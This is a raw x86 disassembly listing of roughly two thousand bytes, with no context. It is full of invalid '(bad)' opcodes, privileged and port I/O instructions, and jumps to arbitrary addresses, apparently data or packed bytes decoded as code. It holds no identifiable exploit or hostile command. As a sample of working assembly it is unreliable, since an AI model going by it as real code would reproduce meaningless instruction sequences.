  413a57:	daa    
  413a58:	fcmovne st,st(2)
  413a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a5b:	popf   
  413a5c:	mov    dl,0xc5
  413a5e:	je     0x413ad5
  413a60:	and    BYTE PTR ds:0x9a677ca3,bl
  413a66:	dec    esp
  413a67:	data16 add BYTE PTR [eax],al
  413a6a:	push   esi
  413a6b:	add    ch,BYTE PTR [esi-0x75]
  413a6e:	push   ebp
  413a6f:	add    dh,dl
  413a71:	add    BYTE PTR [eax],al
  413a73:	stos   DWORD PTR es:[edi],eax
  413a74:	cli    
  413a75:	jmp    0x413a6c
  413a77:	pop    es
  413a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a79:	std    
  413a7a:	inc    esp
  413a7b:	jno    0x413a7d
  413a7d:	add    dh,dh
  413a7f:	imul   ebx,DWORD PTR [ebp-0x56],0x44d06e06
  413a86:	adc    eax,DWORD PTR [eax]
  413a88:	add    BYTE PTR [ebp-0x7b],bh
  413a8b:	add    al,0x5e
  413a8d:	add    BYTE PTR [eax],al
  413a8f:	popf   
  413a90:	push   cs
  413a91:	push   esp
  413a93:	add    DWORD PTR [edx+0x45746339],0x5f
  413a9a:	test   edi,esp
  413a9c:	inc    edi
  413a9d:	pop    edi
  413a9e:	pop    ss
  413a9f:	mov    edi,0xee04f3d4
  413aa4:	add    BYTE PTR [eax],al
  413aa6:	call   0x5dfee2e3
  413aab:	repz jg 0x413ae6
  413aae:	sub    esp,DWORD PTR [edi]
  413ab0:	addr16 add al,0x24
  413ab3:	add    BYTE PTR [eax],al
  413ab5:	mov    eax,0xef6951da
  413aba:	(bad)  
  413abb:	pop    esi
  413abc:	push   es
  413abd:	sub    BYTE PTR [edx],bh
  413abf:	sub    al,0x3e
  413ac1:	icebp  
  413ac2:	cld    
  413ac3:	aas    
  413ac4:	enter  0xdd,0x0
  413ac8:	not    dl
  413aca:	mov    ah,0x4a
  413acc:	repnz sub BYTE PTR [edi+0x25],cl
  413ad0:	(bad)  
  413ad2:	xchg   ebx,eax
  413ad3:	in     eax,0xa8
  413ad5:	ficomp WORD PTR [esi+0x24]
  413ad8:	mov    ds:0x7c970d6f,eax
  413add:	lods   eax,DWORD PTR ds:[esi]
  413ade:	mov    edx,0x174c4dc3
  413ae3:	add    BYTE PTR [eax],al
  413ae5:	mov    dl,BYTE PTR [edi+0x0]
  413ae8:	je     0x413aea
  413aea:	add    BYTE PTR [esi+0x68597ffb],dl
  413af0:	or     al,0x6f
  413af2:	add    BYTE PTR [eax],al
  413af4:	xor    esi,eax
  413af6:	loopne 0x413ad9
  413af8:	and    BYTE PTR [eax],ah
  413afa:	ret    0xd608
  413afd:	add    BYTE PTR [eax],al
  413aff:	cmp    eax,0xe07b3ce7
  413b04:	aas    
  413b05:	mov    ah,0x3f
  413b07:	lea    ebp,[ebp+0x40]
  413b0a:	sub    DWORD PTR [eax],eax
  413b0c:	add    BYTE PTR [ebx+0x7d],ah
  413b0f:	fcmovnu st,st(2)
  413b11:	and    dh,bh
  413b13:	fs pusha 
  413b15:	push   ecx
  413b16:	pop    edx
  413b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b18:	inc    esp
  413b19:	add    DWORD PTR [eax],eax
  413b1b:	add    BYTE PTR ds:0x2588f845,bl
  413b21:	add    BYTE PTR [eax],al
  413b23:	das    
  413b24:	fdiv   DWORD PTR [esp+eiz*8]
  413b27:	jae    0x413abf
  413b29:	and    DWORD PTR [ebx-0x6c4267a2],0xffffffaf
  413b30:	jg     0x413b74
  413b32:	add    bh,BYTE PTR [esp+eax*8-0x26]
  413b36:	add    BYTE PTR [eax],al
  413b38:	rcl    DWORD PTR [esi],cl
  413b3a:	mov    ecx,0xc5804191
  413b3f:	add    BYTE PTR [eax],al
  413b41:	pop    ss
  413b42:	fimul  DWORD PTR [ebx+eax*1+0x0]
  413b46:	add    BYTE PTR [ecx+ecx*2+0x1d],bh
  413b4a:	fnstsw WORD PTR [eax+0x80c8fe]
  413b50:	add    dl,cl
  413b52:	mov    dh,0x9b
  413b54:	jo     0x413baf
  413b56:	mov    esp,0xe184e559
  413b5b:	add    BYTE PTR [eax],al
  413b5d:	fldcw  WORD PTR ds:0x210c
  413b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b64:	dec    eax
  413b65:	pop    edx
  413b66:	add    BYTE PTR [eax],al
  413b68:	rep ins BYTE PTR es:[edi],dx
  413b6a:	fs aas 
  413b6c:	jecxz  0x413b02
  413b6e:	push   ecx
  413b6f:	daa    
  413b70:	(bad)  
  413b71:	jo     0x413b9f
  413b73:	lods   eax,DWORD PTR ds:[esi]
  413b74:	xchg   ebp,eax
  413b75:	jmp    0x413bb3
  413b77:	fisttp QWORD PTR [esi+0xacc8]
  413b7d:	imul   edi,DWORD PTR [edx+0x46],0xffffffe4
  413b81:	xchg   ebx,eax
  413b82:	jbe    0x413b8c
  413b84:	cmp    DWORD PTR [eax],eax
  413b86:	add    BYTE PTR [ebx+0x6d9dc9a4],dh
  413b8c:	outs   dx,BYTE PTR ds:[esi]
  413b8d:	pop    esp
  413b8e:	sbb    BYTE PTR [ecx-0x35],ah
  413b91:	not    eax
  413b93:	scas   al,BYTE PTR es:[edi]
  413b94:	jle    0x413b71
  413b96:	fstp   TBYTE PTR [eax]
  413b98:	mov    edi,ebx
  413b9a:	push   es
  413b9b:	inc    esi
  413b9c:	das    
  413b9d:	push   edi
  413b9e:	jo     0x413b9a
  413ba0:	mov    al,ds:0x5391a06e
  413ba5:	inc    ebx
  413ba6:	test   eax,0x230016
  413bab:	add    BYTE PTR [ebp+0x34c04d],dl
  413bb1:	add    BYTE PTR [ecx+0x715533bf],ah
  413bb7:	call   0xd84035
  413bbc:	add    BYTE PTR [ebp+edx*8-0x6e],dl
  413bc0:	add    DWORD PTR [edi+ebp*1-0x719ff2d6],edx
  413bc7:	sbb    DWORD PTR [ecx-0x14],edx
  413bca:	mov    ebx,0x4ddd19d3
  413bcf:	mov    edi,0x979650e1
  413bd4:	mov    bh,0xfa
  413bd6:	inc    ebx
  413bd7:	inc    ecx
  413bd8:	push   0x7f
  413bda:	jno    0x413c46
  413bdc:	mul    DWORD PTR [eax+0x74cad1d]
  413be2:	add    BYTE PTR [eax],al
  413be4:	popf   
  413be5:	push   edx
  413be6:	sub    DWORD PTR [eax+edx*2+0x496f0000],eax
  413bed:	dec    esp
  413bee:	sub    al,BYTE PTR [eax]
  413bf0:	add    BYTE PTR [edx+esi*8-0x9fb5626],dl
  413bf7:	add    BYTE PTR [eax],al
  413bf9:	in     eax,dx
  413bfa:	push   esp
  413bfb:	aam    0x51
  413bfd:	call   0x8f3ec17d
  413c02:	mov    ds:0xeba19220,al
  413c07:	fld    st(2)
  413c09:	cdq    
  413c0a:	test   DWORD PTR [edi+0x1ca3a72a],edx
  413c10:	pushf  
  413c11:	les    eax,FWORD PTR [eax]
  413c13:	add    BYTE PTR [eax],al
  413c15:	(bad)  
  413c16:	mov    cl,0x6f
  413c18:	adc    al,0x11
  413c1a:	(bad)  
  413c1b:	nop
  413c1c:	(bad)  [edx+0x38636327]
  413c22:	sbb    esp,DWORD PTR [edi-0x79]
  413c25:	and    eax,ebx
  413c27:	mov    ebx,0x3acd3172
  413c2c:	push   ebx
  413c2d:	sti    
  413c2e:	mov    ch,0x61
  413c30:	aad    0xde
  413c32:	stos   BYTE PTR es:[edi],al
  413c33:	stos   BYTE PTR es:[edi],al
  413c34:	dec    ebx
  413c35:	mov    al,ds:0xd23fef05
  413c3a:	add    esp,DWORD PTR [ecx+eax*4]
  413c3d:	retf   0xb49a
  413c40:	add    eax,0xf6082a
  413c45:	add    BYTE PTR [ebx-0x63],al
  413c48:	fiadd  DWORD PTR [ebp+0x2f]
  413c4b:	dec    esp
  413c4c:	call   0xc489:0x74010000
  413c53:	call   0x703e:0x4e210000
  413c5a:	(bad)  
  413c5b:	dec    edx
  413c5c:	jns    0x413c17
  413c5e:	fbld   TBYTE PTR [edi+0x347c302c]
  413c64:	fld    DWORD PTR [eax]
  413c66:	arpl   WORD PTR [eax],ax
  413c68:	add    BYTE PTR [eax-0x68f32ef7],ah
  413c6e:	add    BYTE PTR [eax],al
  413c70:	rcr    BYTE PTR [ebx],1
  413c72:	xlat   BYTE PTR ds:[ebx]
  413c73:	xor    eax,0xa4e371c
  413c78:	test   al,0x90
  413c7a:	fcomp  DWORD PTR [ebp+0x2d490230]
  413c80:	mov    WORD PTR [esi+0x0],es
  413c83:	add    BYTE PTR [eax-0x4d],dl
  413c86:	mul    DWORD PTR [ecx-0x3fa957e5]
  413c8c:	cmc    
  413c8d:	add    BYTE PTR [eax],al
  413c8f:	icebp  
  413c90:	pop    ebp
  413c91:	sbb    BYTE PTR [ebx-0x7e],dl
  413c94:	or     eax,0xc3ca7797
  413c99:	(bad)  
  413c9a:	in     al,0x8
  413c9c:	cmp    DWORD PTR [eax],eax
  413c9e:	add    BYTE PTR [esi-0x24],ch
  413ca1:	mov    bl,0x57
  413ca3:	inc    esp
  413ca4:	cdq    
  413ca5:	add    BYTE PTR [eax],al
  413ca7:	jmp    0x541f:0x222dd26e
  413cae:	or     BYTE PTR ds:0xcbaa0000,ch
  413cb4:	pop    esp
  413cb5:	lods   eax,DWORD PTR ds:[esi]
  413cb6:	pop    ss
  413cb7:	xchg   esp,eax
  413cb8:	fdivr  DWORD PTR [esi-0x25]
  413cbb:	pop    ss
  413cbc:	mov    esi,0xc4223905
  413cc1:	out    0x0,eax
  413cc3:	add    al,bh
  413cc5:	or     eax,0xff5e6ade
  413cca:	push   ebx
  413ccb:	sbb    eax,0x9d492266
  413cd0:	push   esi
  413cd1:	stos   DWORD PTR es:[edi],eax
  413cd2:	xchg   esi,eax
  413cd3:	jmp    0xd79a:0x776d297b
  413cda:	push   esi
  413cdb:	dec    esi
  413cdc:	dec    esi
  413cdd:	pop    ecx
  413cde:	mov    esp,0x45a6a72e
  413ce3:	bound  ebx,QWORD PTR [esi+ecx*2-0x4b]
  413ce7:	jle    0x413cd2
  413ce9:	add    edi,DWORD PTR [ebp-0x19]
  413cec:	fdiv   st,st(3)
  413cee:	popf   
  413cef:	push   esp
  413cf0:	fistp  WORD PTR [eax]
  413cf2:	loopne 0x413d65
  413cf4:	push   cs
  413cf5:	sub    edi,esp
  413cf7:	jle    0x413d77
  413cf9:	jnp    0x413cc4
  413cfb:	into   
  413cfc:	push   0x77
  413cfe:	imul   edi
  413d00:	lds    edx,FWORD PTR [esi+0x16983a0a]
  413d06:	outs   dx,BYTE PTR ds:[esi]
  413d07:	xor    eax,0xbd64edf
  413d0c:	jmp    0xe77c58bb
  413d11:	mul    DWORD PTR [edx-0x6d6db6e]
  413d17:	sub    cl,BYTE PTR [edx-0x150236e2]
  413d1d:	sbb    al,0xc2
  413d1f:	add    al,0xd0
  413d21:	add    BYTE PTR [eax],al
  413d23:	pop    edx
  413d24:	shr    BYTE PTR [eax+eax*1],0x0
  413d28:	(bad)  
  413d29:	je     0x413cc0
  413d2b:	add    al,0xa9
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	out    0x77,eax
  413d31:	mov    DWORD PTR [esi],ebx
  413d33:	pushf  
  413d34:	retf   0x72b4
  413d37:	daa    
  413d38:	sub    eax,0x804938bd
  413d3d:	int    0x0
  413d3f:	add    BYTE PTR ds:0x595b29f,dl
  413d45:	test   DWORD PTR [ecx+0x765d87c],edi
  413d4b:	xchg   ecx,eax
  413d4c:	fidiv  DWORD PTR [edi]
  413d4e:	jnp    0x413da2
  413d50:	pop    DWORD PTR [edx]
  413d52:	and    dl,BYTE PTR [edx-0x1f16e4d3]
  413d58:	cmc    
  413d59:	loopne 0x413cdf
  413d5b:	je     0x413d5d
  413d5d:	add    BYTE PTR [ebp+0x241dcf2a],bh
  413d63:	inc    esi
  413d64:	fsub   st(0),st
  413d66:	aas    
  413d67:	(bad)  
  413d68:	xlat   BYTE PTR ds:[ebx]
  413d69:	mov    al,ds:0x70d56d51
  413d6e:	test   DWORD PTR [esi],0x52325924
  413d74:	push   ds
  413d75:	jl     0x413dcf
  413d77:	push   ds
  413d78:	inc    ah
  413d7a:	jp     0x413d7c
  413d7c:	add    BYTE PTR [ecx+0x32ebc32f],bl
  413d82:	inc    esp
  413d83:	leave  
  413d84:	add    BYTE PTR [eax],al
  413d86:	add    al,0xcb
  413d88:	add    BYTE PTR [eax],al
  413d8a:	stos   BYTE PTR es:[edi],al
  413d8b:	cmc    
  413d8c:	into   
  413d8d:	(bad)  
  413d8f:	fwait
  413d90:	add    DWORD PTR [edi+0x2825d4da],edx
  413d96:	dec    ebp
  413d97:	and    dl,BYTE PTR [ebp-0x1e84291d]
  413d9d:	lock adc BYTE PTR [esi],dh
  413da0:	(bad)
  413da3:	pop    ebx
  413da4:	pop    ds
  413da5:	shl    DWORD PTR es:[ebx+0x708ca497],1
  413dac:	add    BYTE PTR [eax],al
  413dae:	sub    edi,DWORD PTR [ebx-0x7b]
  413db1:	push   ecx
  413db2:	jo     0x413d9e
  413db4:	push   es
  413db5:	ja     0x413d76
  413db7:	sbb    al,0x6b
  413db9:	mov    ebx,0x6679e53
  413dbe:	lds    eax,FWORD PTR [ebp+0x60]
  413dc1:	clc    
  413dc2:	loopne 0x413d47
  413dc4:	popa   
  413dc5:	(bad)  
  413dc6:	ins    BYTE PTR es:[edi],dx
  413dc7:	rol    BYTE PTR [eax+0x2c000015],cl
  413dcd:	(bad)  
  413dce:	dec    ecx
  413dcf:	fs leave 
  413dd1:	scas   al,BYTE PTR es:[edi]
  413dd2:	dec    ebx
  413dd3:	(bad)
  413dd8:	lock add BYTE PTR [eax],al
  413ddb:	das    
  413ddc:	xchg   ebp,eax
  413ddd:	test   eax,0xd23df6a2
  413de2:	(bad)  ds:0x426a035c
  413de8:	mov    cl,0xe2
  413dea:	inc    ecx
  413deb:	sub    ebp,DWORD PTR [ebx-0x57]
  413dee:	ins    BYTE PTR es:[edi],dx
  413def:	fistp  WORD PTR [ecx-0x2d]
  413df2:	xchg   esi,eax
  413df3:	iret   
  413df4:	mov    dh,0xfa
  413df6:	xor    edx,DWORD PTR es:0x59c0
  413dfd:	scas   al,BYTE PTR es:[edi]
  413dfe:	cdq    
  413dff:	push   eax
  413e00:	jb     0x413da1
  413e02:	dec    edx
  413e03:	xor    esp,DWORD PTR [esi+ebp*2-0x37]
  413e07:	add    BYTE PTR [eax+eax*1+0x0],0xb6
  413e0c:	mov    al,ds:0xc32c2db0
  413e11:	rol    BYTE PTR [eax-0x64],cl
  413e14:	add    BYTE PTR [eax],al
  413e16:	and    BYTE PTR [eax+0xae40e9],bh
  413e1c:	add    BYTE PTR [eax],ah
  413e1e:	mov    edi,0x13fbd6b5
  413e23:	jno    0x413e55
  413e25:	rcr    esi,0x5e
  413e28:	mov    BYTE PTR [ebx],cl
  413e2a:	add    BYTE PTR [eax],al
  413e2c:	out    0x59,eax
  413e2e:	fsub   QWORD PTR [ebx]
  413e30:	ds and al,0xc3
  413e33:	enter  0x27,0x0
  413e37:	es jbe 0x413e75
  413e3a:	sub    DWORD PTR [edi-0x2e],0xafc4ca
  413e41:	add    BYTE PTR [edx+0x7b],dh
  413e44:	scas   al,BYTE PTR es:[edi]
  413e45:	lea    ebx,[edi+0x56]
  413e48:	or     al,0xde
  413e4a:	add    BYTE PTR [eax],al
  413e4c:	stos   DWORD PTR es:[edi],eax
  413e4d:	xchg   edx,eax
  413e4e:	out    0xa4,eax
  413e50:	outs   dx,BYTE PTR ds:[esi]
  413e51:	lds    edi,FWORD PTR [ebx]
  413e53:	or     DWORD PTR [eax],0xffffffa5
  413e56:	add    BYTE PTR [eax],al
  413e58:	das    
  413e59:	push   ecx
  413e5a:	std    
  413e5b:	and    edi,edx
  413e5d:	sti    
  413e5e:	test   DWORD PTR [ebp+0x75d9272f],0xcfc225d9
  413e68:	or     dl,BYTE PTR [esi+0x7d15719e]
  413e6e:	test   BYTE PTR [edi-0x63b0000],bh
  413e74:	sbb    ch,bl
  413e76:	mov    cl,0x3
  413e78:	shr    BYTE PTR [eax],cl
  413e7a:	push   edx
  413e7b:	(bad)  
  413e7c:	sbb    BYTE PTR ss:[esi+0x6b],0xf8
  413e81:	mov    ds:0x6fb4acf2,eax
  413e86:	or     al,0x15
  413e88:	add    BYTE PTR [eax],al
  413e8a:	xchg   BYTE PTR [eax+eax*1],al
  413e8d:	add    BYTE PTR [eax],al
  413e8f:	outs   dx,BYTE PTR ds:[esi]
  413e90:	push   0x17
  413e92:	stos   DWORD PTR es:[edi],eax
  413e93:	int3   
  413e94:	pop    esi
  413e95:	add    BYTE PTR [eax],al
  413e97:	cli    
  413e98:	out    dx,ax
  413e9a:	dec    ebx
  413e9b:	xchg   DWORD PTR [ebx],ebp
  413e9d:	jmp    0x5f878e
  413ea2:	add    BYTE PTR [edi-0xc],ch
  413ea5:	ja     0x413e2b
  413ea7:	sub    al,0x0
  413ea9:	add    BYTE PTR [ecx],ch
  413eab:	jnp    0x413e98
  413ead:	xor    BYTE PTR [edi],ah
  413eaf:	push   ebp
  413eb0:	aas    
  413eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb2:	mov    esp,ebx
  413eb4:	or     edx,DWORD PTR [eax+0x30]
  413eb7:	int3   
  413eb8:	fadd   DWORD PTR [eax]
  413eba:	add    BYTE PTR [edi],bl
  413ebc:	shr    DWORD PTR [edi-0x76],0xe4
  413ec0:	cmc    
  413ec1:	mov    eax,ds:0x276e962c
  413ec6:	push   cs
  413ec7:	gs pop esi
  413ec9:	or     ah,0x73
  413ecc:	add    BYTE PTR [eax],al
  413ece:	inc    esp
  413ecf:	add    BYTE PTR [eax],al
  413ed1:	add    BYTE PTR ds:0x908cb5,dl
  413ed7:	add    BYTE PTR [ecx+0x3f60cd32],ch
  413edd:	fwait
  413ede:	mov    cl,0x1e
  413ee0:	mov    edi,DWORD PTR [esi]
  413ee2:	popa   
  413ee3:	clc    
  413ee4:	clc    
  413ee5:	fbstp  TBYTE PTR [edi]
  413ee7:	mov    al,0x83
  413ee9:	push   esi
  413eea:	je     0x413f3e
  413eec:	mov    BYTE PTR [edi+0x0],al
  413eef:	add    ch,ah
  413ef1:	arpl   bp,ax
  413ef3:	push   esp
  413ef4:	cmc    
  413ef5:	xchg   esi,eax
  413ef6:	ins    DWORD PTR es:[edi],dx
  413ef7:	xor    eax,0x16d85b95
  413efc:	loop   0x413f7b
  413efe:	repz add ch,BYTE PTR [ebx*4-0x3271c9f9]
  413f06:	and    DWORD PTR [edi-0x7e],eax
  413f09:	mov    cs,WORD PTR [esi]
  413f0b:	xchg   cl,dh
  413f0d:	pushf  
  413f0e:	add    bl,BYTE PTR [ebx+0x73]
  413f11:	nop
  413f12:	and    DWORD PTR [eax-0x11],ecx
  413f15:	add    BYTE PTR [eax],al
  413f17:	jo     0x413eef
  413f19:	je     0x413f21
  413f1b:	push   eax
  413f1c:	ret    
  413f1d:	test   al,0x5f
  413f1f:	in     eax,dx
  413f20:	aad    0xef
  413f22:	lock sub eax,0x43445b
  413f29:	add    BYTE PTR ds:0x18fddc10,al
  413f2f:	pop    edx
  413f30:	dec    ecx
  413f31:	adc    esp,DWORD PTR [esi]
  413f33:	mov    eax,0x8decabb2
  413f38:	pop    ds
  413f39:	xchg   ecx,eax
  413f3a:	cmp    ch,BYTE PTR [eax]
  413f3c:	icebp  
  413f3d:	sbb    ecx,DWORD PTR [eax-0x41fffff2]
  413f43:	dec    edx
  413f44:	loop   0x413f5b
  413f46:	mov    al,ds:0x52c3cd45
  413f4b:	pop    eax
  413f4c:	bound  esi,QWORD PTR [ecx+0x2fd9582c]
  413f52:	loope  0x413f6e
  413f54:	push   edi
  413f55:	pop    ss
  413f56:	iret   
  413f57:	dec    edi
  413f58:	mov    BYTE PTR [eax+0x0],ch
  413f5b:	add    BYTE PTR [ecx],dh
  413f5d:	pop    ebx
  413f5e:	or     esp,DWORD PTR [eax]
  413f60:	mov    eax,ds:0x5079b515
  413f65:	pop    ds
  413f66:	icebp  
  413f67:	hlt    
  413f68:	pop    edx
  413f69:	jmp    0xe47:0x19e71fa5
  413f70:	push   esi
  413f71:	adc    eax,0xb90c
  413f76:	cs call 0xef826568
  413f7c:	lock jp 0x413f9e
  413f7f:	push   eax
  413f80:	aaa    
  413f81:	(bad)  
  413f83:	pop    ss
  413f84:	lods   al,BYTE PTR ds:[esi]
  413f85:	push   edi
  413f86:	ins    BYTE PTR es:[edi],dx
  413f87:	pushf  
  413f88:	(bad)  
  413f89:	stc    
  413f8a:	push   ebx
  413f8b:	lods   eax,DWORD PTR ds:[esi]
  413f8c:	fnstsw WORD PTR [ecx+0x601eeed4]
  413f92:	sbb    DWORD PTR [ebx],0xb191afed
  413f98:	dec    ebp
  413f99:	pop    esi
  413f9a:	loop   0x413fc3
  413f9c:	out    dx,eax
  413f9d:	call   0x41e76e
  413fa2:	add    WORD PTR [ecx-0x1a],di
  413fa6:	jbe    0x41400a
  413fa8:	(bad)  [ecx+ebp*8-0x5c9ed051]
  413faf:	pop    eax
  413fb0:	add    al,0xca
  413fb2:	add    BYTE PTR [eax],al
  413fb4:	jmp    0x413fb2
  413fb6:	je     0x413fbd
  413fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb9:	or     dh,BYTE PTR ds:[ebx+0x7d5e4e9d]
  413fc0:	fbld   TBYTE PTR [esi+eax*8+0xee44c5]
  413fc7:	add    cl,al
  413fc9:	push   ss
  413fca:	addr16 (bad) 
  413fcc:	out    dx,eax
  413fcd:	or     DWORD PTR [edi-0x49],esp
  413fd0:	adc    DWORD PTR [esi+0x6cd38ab],ecx
  413fd6:	mov    ds:0x383bec4a,eax
  413fdb:	inc    edi
  413fdc:	cmp    dh,bl
  413fde:	xor    BYTE PTR [ebp-0x26],cl
  413fe1:	pusha  
  413fe2:	fbstp  TBYTE PTR [eax]
  413fe4:	or     eax,0x2e602e64
  413fe9:	inc    ebx
  413fea:	imul   ecx,DWORD PTR [edx],0xffffffa7
  413fed:	arpl   WORD PTR [esi-0x193898fe],dx
  413ff3:	mov    esp,0xde0c4f
  413ff8:	add    BYTE PTR [ecx+0x34],ch
  413ffb:	xor    esi,DWORD PTR [ebp-0x39bb638a]
  414001:	add    BYTE PTR [eax],al
  414003:	push   esi
  414004:	mov    eax,ds:0xb6a370fa
  414009:	push   0x624e9cac
  41400e:	stos   DWORD PTR es:[edi],eax
  41400f:	sbb    BYTE PTR [eax],ch
  414011:	fsub   DWORD PTR [esi]
  414013:	imul   eax,eax,0xffffffaf
  414016:	add    BYTE PTR [eax],al
  414018:	fadd   st,st(5)
  41401a:	inc    edi
  41401b:	push   0xdc693cfa
  414020:	add    eax,0xef7e3d62
  414025:	adc    DWORD PTR [edx-0x548c3afe],0xa3e3d172
  41402f:	inc    ebx
  414030:	push   ss
  414031:	mov    dh,0x86
  414033:	pop    es
  414034:	repz or DWORD PTR [ebx+0x752acaa0],esp
  41403b:	sub    cl,BYTE PTR [edi]
  41403d:	outs   dx,BYTE PTR ds:[esi]
  41403e:	jle    0x414089
  414040:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414042:	(bad)  
  414044:	pop    DWORD PTR [esi-0x5f]
  414047:	mov    ds:0x21d04a4e,eax
  41404c:	mov    esp,DWORD PTR [ecx+0x6c]
  41404f:	stos   DWORD PTR es:[edi],eax
  414050:	xor    cl,BYTE PTR [ebp+0x1d]
  414053:	adc    al,0xbb
  414055:	xchg   ebp,eax
  414056:	pop    esp
  414057:	fbstp  TBYTE PTR [ecx]
  414059:	pushw  cs
  41405b:	mov    eax,ds:0x79278edb
  414060:	push   0x2eec503f
  414065:	fwait
  414066:	loopne 0x414096
  414068:	inc    esp
  414069:	mov    esp,0x1f480000
  41406e:	add    BYTE PTR [eax],al
  414070:	cmp    al,BYTE PTR [ebp-0x11]
  414073:	sub    eax,0xfc872835
  414078:	outs   dx,BYTE PTR ds:[esi]
  414079:	sti    
  41407a:	add    BYTE PTR [ebp+0x56489e],0x0
  414081:	inc    eax
  414082:	pop    ss
  414083:	add    BYTE PTR [eax],al
  414085:	data16 adc dl,ah
  414088:	call   0x3277:0xe7c2310b
  41408f:	and    edx,DWORD PTR [edi]
  414091:	sbb    dl,BYTE PTR [eax*1+0x43a10bac]
  414098:	dec    ecx
  414099:	mov    ah,0xf
  41409b:	in     eax,dx
  41409c:	cwde   
  41409d:	stos   DWORD PTR es:[edi],eax
  41409e:	(bad)  
  4140a0:	pop    ebp
  4140a1:	mov    ch,al
  4140a3:	add    BYTE PTR [eax],al
  4140a5:	aas    
  4140a6:	sub    eax,0x4d6a8268
  4140ab:	hlt    
  4140ac:	retf   0x61c6
  4140af:	test   eax,0xbd84b170
  4140b4:	add    BYTE PTR [eax],al
  4140b6:	arpl   di,bp
  4140b8:	push   cs
  4140b9:	xchg   eax,esi
  4140bb:	mov    cl,0x56
  4140bd:	sbb    BYTE PTR [ebp-0x44b40000],0x0
  4140c4:	add    BYTE PTR [edx],dl
  4140c6:	mov    esp,0x4e786011
  4140cb:	ins    BYTE PTR es:[edi],dx
  4140cc:	mov    ebx,0x268087
  4140d1:	add    BYTE PTR [ebx-0x4090ca9b],cl
  4140d7:	add    bh,cl
  4140d9:	push   esi
  4140da:	test   edi,esi
  4140dc:	add    eax,0x67876769
  4140e1:	xor    DWORD PTR [edx+0x4e1f32d2],0xffffffec
  4140e8:	jg     0x4140d1
  4140ea:	je     0x4140d6
  4140ec:	das    
  4140ed:	adc    al,0xe7
  4140ef:	out    dx,eax
  4140f0:	mov    dl,BYTE PTR [eax-0x73df1c4]
  4140f6:	dec    eax
  4140f7:	test   BYTE PTR [eax],al
  4140f9:	add    BYTE PTR [eax],dl
  4140fb:	ins    BYTE PTR es:[edi],dx
  4140fc:	outs   dx,BYTE PTR fs:[esi]
  4140fe:	dec    esp
  4140ff:	xor    eax,DWORD PTR [eax]
  414101:	add    BYTE PTR [edi+0x4a],bh
  414104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414105:	cmp    edi,DWORD PTR [ebp+0x7e05f187]
  41410b:	cs cli 
  41410d:	aaa    
  41410e:	test   BYTE PTR [ebx-0xb],0x97
  414112:	add    al,0xdc
  414114:	add    BYTE PTR [eax],al
  414116:	lods   al,BYTE PTR ds:[esi]
  414117:	inc    esi
  414118:	and    al,0xe4
  41411a:	icebp  
  41411b:	xchg   esp,eax
  41411c:	cmp    ch,BYTE PTR ds:0xa7189ab4
  414122:	dec    eax
  414123:	add    DWORD PTR [eax],0x15c4e000
  414129:	add    BYTE PTR [eax],al
  41412b:	sbb    edx,DWORD PTR [edi+esi*2]
  41412e:	aam    0x6b
  414130:	or     DWORD PTR [ecx+0x37],edi
  414133:	jns    0x414185
  414135:	lahf   
  414136:	in     al,0x70
  414138:	dec    esp
  414139:	inc    BYTE PTR [eax]
  41413b:	add    BYTE PTR [ebp+0x66],cl
  41413e:	push   edx
  41413f:	cmc    
  414140:	xlat   BYTE PTR ds:[ebx]
  414141:	into   
  414142:	push   esi
  414143:	cwde   
  414144:	into   
  414145:	(bad)  
  414147:	dec    ebx
  414148:	mov    BYTE PTR [edx-0x19940000],dh
  41414e:	mov    eax,esp
  414150:	push   esp
  414151:	div    BYTE PTR [ecx+esi*1-0x31cfb6f1]
  414158:	add    eax,DWORD PTR [ecx]
  41415a:	fistp  QWORD PTR [ecx]
  41415c:	dec    esp
  41415d:	fwait
  41415e:	add    BYTE PTR [eax],al
  414160:	shl    DWORD PTR [esi],cl
  414162:	xchg   esp,eax
  414163:	call   0x989f5844
  414168:	aaa    
  414169:	xchg   edx,eax
  41416a:	add    dh,ah
  41416c:	xchg   edx,eax
  41416d:	lahf   
  41416e:	pop    eax
  41416f:	adc    al,0x6a
  414171:	jge    0x4141e7
  414173:	scas   eax,DWORD PTR es:[edi]
  414174:	or     DWORD PTR [ebp-0x3c8f508d],edi
  41417a:	jne    0x414185
  41417c:	add    eax,0xf07c2850
  414181:	aas    
  414182:	hlt    
  414183:	fdivr  QWORD PTR [ecx-0x58]
  414186:	sub    BYTE PTR [edi-0x6],bh
  414189:	das    
  41418a:	mov    edx,DWORD PTR [esi-0x1]
  41418d:	mov    eax,DWORD PTR [edx+0x2e]
  414190:	mov    eax,ds:0x77c4
  414195:	mov    ch,0xe2
  414197:	(bad)  
  414198:	lea    ecx,[esi]
  41419a:	dec    ebx
  41419b:	mov    WORD PTR [ebx+0x0],gs
  41419e:	add    BYTE PTR [esi],al
  4141a0:	mov    DWORD PTR [ebx-0x7dc1eb9c],ebx
  4141a6:	or     al,0x14
  4141a8:	add    BYTE PTR [eax],al
  4141aa:	push   cs
  4141ab:	dec    eax
  4141ac:	cmp    DWORD PTR [eax],eax
  4141ae:	add    BYTE PTR ds:0x6fe26fa,al
  4141b4:	pop    ds
  4141b5:	adc    BYTE PTR [ecx+ecx*1+0xe040c3],0x0
  4141bd:	mov    cl,0x81
  4141bf:	mov    ?,WORD PTR [eax+0x1ea78973]
  4141c5:	out    dx,eax
  4141c6:	data16 stc 
  4141c8:	mov    ecx,gs
  4141ca:	add    BYTE PTR [eax],al
  4141cc:	adc    DWORD PTR [esi-0x4c972625],edx
  4141d2:	dec    ebx
  4141d3:	jmp    DWORD PTR [ebp+eax*2-0x1d]
  4141d7:	xor    al,0xc
  4141d9:	imul   eax,DWORD PTR [eax],0xe0f8ea00
  4141df:	mov    ch,0xaa
  4141e1:	adc    DWORD PTR [ecx-0x3c],ecx
  4141e4:	aaa    
  4141e5:	add    BYTE PTR [eax],al
  4141e7:	shl    DWORD PTR [ecx+0xc04835],1
  4141ed:	add    BYTE PTR [ecx+0x1f],dh
